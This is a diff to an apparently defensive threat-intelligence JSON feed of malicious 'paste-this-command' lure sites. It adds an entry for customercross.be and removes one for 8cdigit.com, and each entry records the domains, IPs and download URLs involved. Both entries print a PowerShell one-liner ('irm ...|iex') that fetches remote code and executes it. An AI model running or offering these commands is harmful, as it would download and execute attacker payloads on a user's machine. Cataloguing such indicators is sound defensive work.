@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "customercross.be",
+    "DeliveryUrl": [
+      "codes-veri.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "195.47.247.18"
+    ],
+    "Related": [
+      {
+        "Value": "https://codes-veri.beer/7df373e3e15b5f53",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'codes-veri.beer/7df373e3e15b5f53'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://codes-veri.beer/7df373e3e15b5f53"
+    ],
+    "ReportId": "cmx0sssfd00140omljarrrimh",
+    "ScannedAt": "2026-11-28T19:23:19.481000+00:00"
+  },
+  {
     "UrlDomain": "www.ctrlsphoto.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -7165,25 +7187,5 @@
     ],
     "ReportId": "cmwnyjfio1xkd0oml9ql1oc6y",
     "ScannedAt": "2026-11-19T19:43:00.229000+00:00"
-  },
-  {
-    "UrlDomain": "8cdigit.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "184.168.108.26"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwnxm1t71xj30oml4e26u03q",
-    "ScannedAt": "2026-11-19T19:17:02.747000+00:00"
   }
 ]
